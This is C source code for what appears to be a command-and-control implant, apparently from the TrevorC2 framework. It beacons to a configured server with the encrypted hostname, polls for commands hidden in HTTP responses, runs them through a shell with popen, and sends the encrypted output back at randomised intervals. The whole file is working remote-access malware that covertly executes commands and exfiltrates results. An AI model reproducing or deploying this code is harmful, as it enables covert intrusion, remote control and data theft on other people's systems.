#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#if defined(__linux__)
#include <netdb.h>
#endif
#if defined(_WIN32) || defined(WIN32)
#include <winsock2.h>
#include <windows.h>
int init_winsock2(void);
extern int winsock_initialized;
#endif
#include "http.h"
#include "debug.h"
#include "b64.h"
#include "sha256.h"
#include "aes.h"
#include "crypto.h"
#include "tc2_config.h"

unsigned char* gcookie = NULL;

void connectTrevor(void)
{
    char hostname[1024];
    char* hostnameString = NULL;
    char* encodedData = NULL;
    char* encodedDataWrap = NULL;
    uint8_t padding = 0;
    unsigned char* outdata = NULL;
    char* pathval = NULL;
    int outdataLen = 0;
    unsigned char* response = NULL;
    unsigned char* cookievalue = NULL;
    unsigned char* endcookie = NULL;
    DEBUG_PRINT("In connectTrevor\n");
    hostname[1023] = '\0';
    /* NOTE: There's better OS specific functions that you can do
     * instead of this*/
    gethostname(hostname, 256);

    if (hostname[0] == 0) {
        memcpy(hostname, "UNKNOWN", strlen("UNKNOWN"));
    }
    DEBUG_PRINT("Hostname: %s\n", hostname);
    hostnameString
        = calloc(strlen(hostname) + strlen("magic_hostname=") + 1, 1);
    if (hostnameString == NULL) {
        return;
    }
    sprintf(hostnameString, "magic_hostname=%s", hostname);
    DEBUG_PRINT("HostnameString: %s\n", hostnameString);
    encodedData = calloc(strlen(hostnameString) + 17, 1);
    if (encodedData == NULL) {
        goto cleanup;
    }
    /*Figure out padding*/
    padding = 16 - (strlen(hostnameString) % 16);
    DEBUG_PRINT("Padding: %d\n", (int)padding);
    memcpy(encodedData, hostnameString, strlen(hostnameString));
    DEBUG_PRINT("Copied hostnameString\n");
    memset(encodedData + strlen(hostnameString), padding, padding);
    DEBUG_PRINT("Set padding\n");
    outdata = encrypt_buffer((unsigned char*)encodedData,
        strlen(hostnameString) + padding, &outdataLen);
    if (encodedData) {
        free(encodedData);
        encodedData = NULL;
    }
    if (outdata == NULL) {
        goto cleanup;
    }
    DEBUG_PRINT("encrypted buffer len: %d\n", outdataLen);
    /*Response looks like its always null terminated*/
    encodedData = b64_encode(outdata, outdataLen);
    DEBUG_PRINT("Encoded : %s\n", encodedData);
    if (encodedData == NULL) {
        goto cleanup;
    }

    encodedDataWrap
        = b64_encode((unsigned char*)encodedData, strlen(encodedData));
    if (encodedDataWrap == NULL) {
        goto cleanup;
    }

    pathval = calloc(strlen(SITE_PATH_QUERY) + 1 + strlen(QUERY_STRING)
            + strlen(encodedDataWrap) + 1,
        1);
    if (pathval == NULL) {
        goto cleanup;
    }
    sprintf(pathval, "%s?%s%s", SITE_PATH_QUERY, QUERY_STRING, encodedDataWrap);

    response
        = http_request(1, "GET", SERVER_HOSTNAME, 80, NULL, pathval, NULL, 0);
    if (response == NULL) {
        goto cleanup;
    }
    /* NOTE: You can ifdef this out if using wininet/libcurl.
     * Pretty much anything that isn't a standard socket */
    cookievalue = (unsigned char*)strstr((char*)response, COOKIE_VALUE);
    if (cookievalue != NULL) {
        DEBUG_PRINT("Got cookie\n");
        cookievalue += strlen(COOKIE_VALUE);
        endcookie = (unsigned char*)strstr((char*)cookievalue, ";");
        if (endcookie != NULL) {
            DEBUG_PRINT("Got end cookie\n");
            gcookie = calloc(endcookie - cookievalue + 1, 1);
            if (gcookie != NULL) {
                memcpy(gcookie, cookievalue, endcookie - cookievalue);
                DEBUG_PRINT("Cookie is %s\n", gcookie);
            }
        }
    } else {
        DEBUG_PRINT("Failed to get cookie\n");
    }

cleanup:
    if (outdata) {
        free(outdata);
    }
    if (encodedData) {
        free(encodedData);
    }
    if (encodedDataWrap) {
        free(encodedDataWrap);
    }
    if (pathval) {
        free(pathval);
    }
    if (hostnameString) {
        free(hostnameString);
    }
    if (response) {
        free(response);
    }
}

unsigned char* getTasking(void)
{
    uint8_t padding = 0;
    char* pathval = NULL;
    unsigned char* response = NULL;
    unsigned char* b64tasking = NULL;
    unsigned char* tasking = NULL;
    size_t taskingLen = 0;
    unsigned char* decryptedtasking = NULL;
    int decryptedtaskingLen = 0;
    unsigned char* starttasking = NULL;
    unsigned char* endtasking = NULL;

    pathval = calloc(strlen(ROOT_PATH_QUERY) + 1, 1);
    sprintf(pathval, "%s", ROOT_PATH_QUERY);

    response = http_request(
        0, "GET", SERVER_HOSTNAME, 80, (char*)gcookie, pathval, NULL, 0);
    if (response == NULL) {
        DEBUG_PRINT("Response is null, returning\n");
        goto cleanup;
    }
    // DEBUG_PRINT("Response Tasking: %s\n", response);
    starttasking = (unsigned char*)strstr((char*)response, STUB);
    if (starttasking == NULL) {
        goto cleanup;
    }
    starttasking += strlen(STUB);
    endtasking = (unsigned char*)strstr((char*)starttasking, ENDSTUB);
    if (endtasking == NULL) {
        goto cleanup;
    }

    b64tasking = calloc((endtasking - starttasking) + 1, 1);
    if (b64tasking == NULL) {
        goto cleanup;
    }
    memcpy(b64tasking, starttasking, endtasking - starttasking);

    tasking = b64_decode_ex(
        (char*)b64tasking, strlen((char*)b64tasking), &taskingLen);
    if (tasking == NULL) {
        goto cleanup;
    }
    decryptedtasking
        = decrypt_buffer(tasking, (int)taskingLen, &decryptedtaskingLen);
    if (decryptedtasking == NULL) {
        DEBUG_PRINT("Failed to decrypttasking\n");
        goto cleanup;
    }
    padding = decryptedtasking[decryptedtaskingLen - 1];
    DEBUG_PRINT("PaddingChar: 0x%x\n", padding);
    if (padding <= 16
        && decryptedtasking[decryptedtaskingLen - padding] == padding) {
        DEBUG_PRINT("Removing padding\n");
        decryptedtasking[decryptedtaskingLen - padding] = 0;
    }

    DEBUG_PRINT("Decrypted tasking : %s\n", decryptedtasking);

cleanup:
    if (response) {
        free(response);
    }
    if (pathval) {
        free(pathval);
    }
    if (b64tasking) {
        free(b64tasking);
    }
    if (tasking) {
        free(tasking);
    }
    return decryptedtasking;
}

void sendTasking(unsigned char* responseData, int responseDataLen)
{
    char hostname[1024];
    char* hostnameString = NULL;
    char* encodedData = NULL;
    char* encodedDataWrap = NULL;
    uint8_t padding = 0;
    unsigned char* outdata = NULL;
    char* pathval = NULL;
    int outdataLen = 0;
    unsigned char* response = NULL;
    DEBUG_PRINT("In sendTasking\n");
    hostname[1023] = '\0';
    /* NOTE: This doesn't need to be done every time. */
    gethostname(hostname, 1023);

    DEBUG_PRINT("Hostname: %s\n", hostname);
    hostnameString = calloc(strlen(hostname) + 4 + responseDataLen + 1, 1);
    if (hostnameString == NULL) {
        return;
    }
    sprintf(hostnameString, "%s::::%s", hostname, responseData);
    DEBUG_PRINT("HostnameString: %s\n", hostnameString);
    encodedData = calloc(strlen(hostnameString) + 17, 1);
    if (encodedData == NULL) {
        goto cleanup;
    }
    /*Figure out padding*/
    padding = 16 - (strlen(hostnameString) % 16);
    DEBUG_PRINT("Padding: %d\n", (int)padding);
    memcpy(encodedData, hostnameString, strlen(hostnameString));
    DEBUG_PRINT("Copied hostnameString\n");
    memset(encodedData + strlen(hostnameString), padding, padding);
    DEBUG_PRINT("Set padding\n");
    outdata = encrypt_buffer((unsigned char*)encodedData,
        strlen(hostnameString) + padding, &outdataLen);

    if (encodedData) {
        free(encodedData);
        encodedData = NULL;
    }
    if (outdata == NULL) {
        goto cleanup;
    }
    DEBUG_PRINT("encrypted buffer len: %d\n", outdataLen);
    /*Response looks like its always null terminated*/
    encodedData = b64_encode(outdata, outdataLen);
    if (encodedData == NULL) {
        goto cleanup;
    }
    DEBUG_PRINT("Encoded : %s\n", encodedData);
    encodedDataWrap
        = b64_encode((unsigned char*)encodedData, strlen(encodedData));
    pathval = calloc(strlen(SITE_PATH_QUERY) + 1 + strlen(QUERY_STRING)
            + strlen(encodedDataWrap) + 1,
        1);
    if (encodedDataWrap == NULL) {
        goto cleanup;
    }
    sprintf(pathval, "%s?%s%s", SITE_PATH_QUERY, QUERY_STRING, encodedDataWrap);

    response = http_request(
        0, "GET", SERVER_HOSTNAME, 80, (char*)gcookie, pathval, NULL, 0);
    if (response == NULL) {
        DEBUG_PRINT("Failed to get response\n");
        goto cleanup;
    }
cleanup:
    if (outdata) {
        free(outdata);
    }
    if (hostnameString) {
        free(hostnameString);
    }
    if (pathval) {
        free(pathval);
    }
    if (response) {
        free(response);
    }
    if (encodedData) {
        free(encodedData);
    }
    if (encodedDataWrap) {
        free(encodedDataWrap);
    }
}

/* NOTE: This works on windows/linux/and mac, but should really use a windows
 * specific method for this and if linux/mac do whats here.*/
unsigned char* doTasking(unsigned char* command, int* outSize)
{
    FILE* pin = NULL;
    unsigned char* shelldata = NULL;
    unsigned char* tempshelldata = NULL;
    size_t readSize = 0;
    size_t fullReadSize = 0;

    pin = popen((char*)command, "r");
    if (pin == NULL) {
        return NULL;
    }
    while (1) {
        tempshelldata = realloc(shelldata, fullReadSize + 2048 + 1);
        if (tempshelldata == NULL) {
            free(shelldata);
            shelldata = NULL;
            break;
        }
        shelldata = tempshelldata;
        memset(shelldata + fullReadSize, 0, 2048 + 1);
        readSize = fread(shelldata + fullReadSize, 1, 2048, pin);
        if (readSize < 2048) {
            fullReadSize += readSize;
            break;
        }
        fullReadSize += readSize;
    }
    DEBUG_PRINT("Full readSize: %d\n", (int)fullReadSize);
    pclose(pin);
    *outSize = (int)fullReadSize;
    return shelldata;
}

#ifdef WIN_MAIN
int WINAPI WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
#else
int main(int argc, char* argv[])
{
#endif
    // char hostname[1024];
    unsigned char* taskingData = NULL;
    unsigned char* commandLocation = NULL;
    unsigned char* shelldata = NULL;
    int outSize = 0;
    int sleepTime = 0;
    // hostname[1023] = '\0';
    // gethostname(hostname, 1023);
    // printf("Hostname: %s\n", hostname);
    srand(time(NULL));
    DEBUG_PRINT("After srandtimenull\n");
#if defined(WIN32) || defined(_WIN32)
    init_winsock2();
#endif

    connectTrevor();
    for (;;) {
        taskingData = getTasking();
        if (taskingData != NULL) {
            DEBUG_PRINT("Tasking: %s\n", taskingData);
            /* NOTE: Since just parsing strings going to throw it in here */
            if (strncmp((char*)taskingData, "nothing", strlen("nothing"))
                != 0) {
                commandLocation
                    = (unsigned char*)strstr((char*)taskingData, "::::");
                commandLocation += strlen("::::");
                if (strncmp(
                        (char*)commandLocation, "killnow", strlen("killnow"))
                    == 0) {
                    DEBUG_PRINT("Killing now\n");
                    free(taskingData);
                    taskingData = NULL;
                    break;
                }

                DEBUG_PRINT("Running command: %s\n Len: %d\n", commandLocation,
                    (int)strlen((char*)commandLocation));
                DEBUG_PRINT("Last char = 0x%x\n",
                    commandLocation[strlen((char*)commandLocation) - 1]);
                shelldata = doTasking(commandLocation, &outSize);
                DEBUG_PRINT("Shelldata: %s outsize : %d\n", shelldata, outSize);
                sendTasking(shelldata, outSize);
                if (shelldata) {
                    free(shelldata);
                    shelldata = NULL;
                }
            }
            free(taskingData);
            taskingData = NULL;
        }
        sleepTime
            = time_interval1 + (rand() % (time_interval2 - time_interval1));
        DEBUG_PRINT("Sleeping for : %d\n", sleepTime);
        (void)sleep(sleepTime);
    }
    if (gcookie) {
        free(gcookie);
    }
    return 0;
}
